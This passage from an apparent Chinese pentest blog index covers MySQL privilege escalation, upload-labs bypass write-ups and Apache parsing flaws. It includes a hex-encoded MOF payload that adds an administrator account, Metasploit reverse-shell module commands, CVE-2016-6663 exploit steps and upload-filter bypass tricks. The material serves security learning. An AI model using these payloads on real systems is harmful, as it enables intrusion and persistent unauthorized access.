C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式： select0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0Aintodumpfile\"C:/windows/system32/wbem/mof/test.mof\"; 3.2.2 痕迹清理 因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果： # 停止 winmgmt 服务 net stop winmgmt # 删除 Repository 文件夹 rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\ # 手动删除 mof 文件 del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S # 删除创建的用户 net user hacker /delete # 重新启动服务 net start winmgmt ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:2","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.3 自动化实现 MSF 里面自带了 MOF 提权模块： msf6 \u003e use exploit/windows/mysql/mysql_mof # 设置好自己的 payload msf6 \u003e set payload windows/meterpreter/reverse_tcp # 设置目标 MySQL 的基础信息 msf6 \u003e set rhosts 192.168.102.1 msf6 \u003e set username root msf6 \u003e set password root msf6 \u003e run ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:3","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4 启动项提权 这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.1 启动项路径 Windows Server 2003 的启动项路径： # 中文系统 C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动 C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 # 英文系统 C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup # 开关机项 需要自己建立对应文件夹 C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Startup C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Shutdown Windows Server 2008 的启动项路径： C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:1","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.2 写入文件 select0x...intodumpfile\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\test.vbs\"; 写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:2","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.2 MSF 自动化实现 msf6 \u003e use exploit/windows/mysql/mysql_start_up 信息 STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:3","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4 CVE-2016-6663 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:0","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.1 原理 竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限 条件： Getshell 拿到 www-data 权限 拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户 关键提取步骤需要在交互环境下，所以需要反弹 shell MySQL 版本需要 \u003c= 5.5.51 或 5.6.x \u003c= 5.6.32 或 5.7.x \u003c= 5.7.14 或 8.x \u003c 8.0.1 MariaDB 版本需要 \u003c= 5.5.51 或 10.0.x \u003c= 10.0.27 或 10.1.x \u003c= 10.1.17 Exp：https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html 在反弹的 shell 中，编译 payload： gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient 执行 EXP 提权： # ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库 ./mysql-privesc-race test 123456 localhost test 参考： http://next.uuzdaisuki.com/2018/07/02/mysql数据库提权总结/ https://www.sqlsec.com/2020/11/mysql.html https://xz.aliyun.com/t/1122 https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7\u0026spm=1001.2101.3001.4242 ","date":"2021-01-19","objectID":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:5:1","tags":["渗透测试","提权"],"title":"MySQL 提权方法整理","uri":"/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试","靶场"],"content":"文件上传漏洞相关","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"文件上传漏洞 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"1 前言 靶场环境：https://github.com/c0ny1/upload-labs 环境搭建： docker pull c0ny1/upload-labs docker run -d -p 80:80 upload-labs 判断上传漏洞的类型： 文件上传漏洞主要存在以下几个方面： 可解析的后缀，也就是该语言有多个可解析的后缀，比如 php 语言可解析的后缀为php，php2，php3 等等 大小写混合，如果系统过滤不严，可能大小写可以绕过。 中间件，每款中间件基本都解析漏洞，比如 iis 就可以把 xxx.asp;.jpg 当 asp 来执行。 系统特性，特别是 Windows 的后缀加点，加空格，加 ::$DATA 可以绕过目标系统。 语言漏洞，流行的三种脚本语言基本都存在 00 截断漏洞。 双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"1.1 可解析的后缀 很多语言都有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。 语言 可解析后缀 asp/aspx asp、aspx、asa、asax、ascx、ashx、asmx、cer php php、php5、php4、php3、php2、phtml、pht jsp jsp、jspa、jspx、jsw、jsv、jspf、jhtml ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:1","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"1.2 中间件漏洞 1.2.1 IIS IIS 一共有三个解析漏洞： IIS 6.0 文件解析 xx.asp;.jpg IIS 6.0 目录解析 xx.asp/1.jpg IIS 7.5 畸形解析 xxx.jpg/x.php 1.2.2 Apahce apache 相关的解析漏洞有两个： %0a (CVE-2017-15715) 未知后缀 test.php.xxx 1.2.3 nginx nginx 解析漏洞有三个： 访问链接加 /xxx.php，即 test.jpg/xxx.php 畸形解析漏洞 test.jpg%00xxx.php CVE-2013-4547 test.jpg(非编码空格)\\0x.php 1.2.4 tomcat tomcat 用于上传绕过的有三种，部分限制在 windows 操作系统下。 xxx.jsp/ xxx.jsp%20 xxx.jsp::$DATA ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:2","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"1.3 系统特性 经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。 Windows 下文件名不区分大小写，Linux下文件名区分大写 Windows 下 ADS 流特性，导致上传文件 xxx.php::$DATA = xxx.php Windows 下文件名结尾加入.、空格、\u003c、\u003e、\u003e\u003e\u003e、0x81-0xff等字符，最终生成的文件均被 windows 忽略。 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:3","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2 WriteUP ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.1 PASS - 01 \u003cscript type=\"text/javascript\"\u003e function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } } \u003c/script\u003e 前端禁用JS，直接上传 Webshell ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:1","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.2 PASS - 02 绕过 MIME 检测，通过 BurpSuite 修改 Content-Type 即可 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:2","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.3 PASS - 03 $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 后端过滤了 .php，通过使用 .php3、php5、php7、phtml、pht 等后缀绕过检测 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:3","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.4 PASS - 04 重写文件解析规则绕过。上传先上传一个名为 .htaccess 文件，内容如下 \u003cFiileMatch \"04.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FiileMatch\u003e 再上传一个 03.jpg ，访问 03.jpg，即以 PHP 文件进行解析。 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:4","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.5 PASS - 05 还是黑名单，加上了 .htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过. ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:5","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.6 PASS - 06 利用 Windows 系统的文件名特性。文件名最后增加点和空格，写成06.php[空格] ， 上传后保存在 Windows 系统上的文件名最后的一个 . 会被去掉，实际上保存的文件名就是 06.php ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:6","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.7 PASS - 07 原理同 Pass-06，文件名后加点，改成 07.php. ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:7","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.8 PASS - 08 Windows 文件流特性绕过，文件名改成 08.php::$DATA，上传成功后保存的文件名其实是 08.php php 在 window 环境下，如果文件名 + ::$DATA 会把 ::$DATA 之后的数据当成文件流处理，不会检测后缀名，且保持 ::$DATA 之前的文件名 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:8","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.9 PASS - 09 原理同 Pass-06，上传文件名后加上点 + 空格+ 点，改为 09.php. . ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:9","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.10 PASS - 10 双写文件名绕过，文件名改成 10.pphphp ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:10","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.11 PASS - 11 上传路径名 %00 截断绕过。上传的文件名写成 11.jpg，save_path 改成 ../upload/11.php%00，最后保存下来的文件就是 11.php ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:11","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.12 PASS - 12 原理同 Pass-11，上传路径 0x00 绕过。这次的 save_path 是通过 post 传进来的，还是利用 00 截断，但这次需要在二进制中进行修改，因为 post 不会像 get 对 %00 进行自动解码 利用 Burpsuite 的 Hex 功能将 save_path 改成 ../upload/12.php[二进制00]形式 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:12","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.13 PASS - 13 绕过文件头检查，添加 GIF 图片的文件头 GIF89a，绕过 GIF 图片检查。 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:13","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.14 PASS - 14 这里用 getimagesize 获取文件类型，还是直接就可以利用图片马就可进行绕过 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:14","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.15 PASS - 15 这里用到 php_exif 模块来判断文件类型，还是直接就可以利用图片马就可进行绕过 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:15","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.16 PASS - 16 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分， 将 Webshell 代码插在该部分，然后上传。具体实现需要自己编写 Python 程序，人工尝试基本是不可能构造出能绕过渲染函数的图片 webshell 的。 参考： https://xz.aliyun.com/t/2657#toc-12 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:16","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.17 PASS - 17 利用条件竞争删除文件时间差绕过。 在脚本运行的时候，访问 Webshell ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:17","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.18 PASS - 18 利用上传重命名竞争 + Apache解析漏洞，成功绕过。 上传名字为 18.php.7Z 的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:18","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.19 PASS - 19 本关考察 CVE-2015-2348 move_uploaded_file() 00 截断，原理同 Pass-11，上传的文件名用 0x00 绕过。改成 19.php[二进制00].1.jpg ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:19","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","靶场"],"content":"2.20 PASS - 20 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } 首先 end 函数取所 post 参数数组中的最后一个值，$file_name = reset($file) . '.' . $file[count($file) - 1]。我们可以 post 一个参数名为一个 [0]一个 [2]，然后 $file[count($file) - 1] 就为空，$file_name 最终就为reset($file) 即 $file[0]，就可以绕过判断 ","date":"2021-01-13","objectID":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:20","tags":["常用","渗透测试"],"title":"文件上传漏洞相关","uri":"/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试"],"content":"WEB 容器安全相关","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"WEB 容器安全 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:0:0","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"1 定义及原理 Web 服务器：提供 Web 服务器的软件或主机，即 Web 服务器软件或者装有 Web 服务器软件的计算机。 Web 中间件：提供系统软件与应用软件之间连接的软件，Web 中间件是提供 web 应用软件和系统软件连接的软件的总称。 Web 容器：容器是中间件的一种，它给处于其中的应用程序组件提供从一个环境，使应用程序直接与容器中的环境变量进行交互而不必关注其他的系统问题。Web 容器用于给处于其中的应用程序组件提供一个环境。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:0","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"2 Apache 安全 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:0","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"2.1 apache 配置错误 2.1.1 原理 AddHandler application/x-httpd-php .php AddHandler 为相应的文件扩展名指定处理程序，上述的配置意味着将扩展名为 .php 的文件交给 x-httpd-php 程序处理 Apache 识别文件扩展名是从后往前的，如果遇到了无法识别的扩展名会接着往前识别，遇到第一个可以识别的扩展名作为该文件的扩展名 2.1.2 配置 2.1.2.1 修改 conf 文件 2.1.2.2 创建 .htaccess 2.1.3 漏洞复现 在有多个后缀的情况下，只要一个文件含有 .php 后缀的文件即将被识别成 PHP 文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 环境运行后，访问 http://your-ip/uploadfiles/apache.php.jpeg 即可发现，phpinfo 被执行了，该文件被解析为 php 脚本。 http://your-ip/index.php 中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为 xxx.php.jpg 或 xxx.php.jpeg 的文件，利用 Apache 解析漏洞进行 getshell。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:1","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"2.2 apache 换行解析漏洞 漏洞编号：CVE-2017-15715 影响版本：Apache 2.4.10 - 2.4.29 漏洞利用：文件上传 漏洞名称：换行解析漏洞 2.2.1 原理 其 2.4.0~2.4.29 版本中存在一个解析漏洞，在解析 PHP 时，1.php\\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。 2.2.2 漏洞复现 \u003c?php if(isset($_FILES['file'])) { $name = basename($_POST['name']); $ext = pathinfo($name, PATHINFO_EXTENSION); if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) { exit('bad file'); } move_uploaded_file($_FILES['file']['tmp_name'], './' . $name); } 在 1.php 后面插入一个 \\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A），不再拦截： 访问刚才上传的 /1.php%0a，发现能够成功解析，但这个文件不是 php 后缀，说明目标存在解析漏洞： ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:2","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"3 Nginx 安全 nginx 是一个高性能的 HTTP 和反向代理 Web 服务器，同时也提供了 IMAP/POP3/SMTP 服务。 中国大陆使用 Nginx 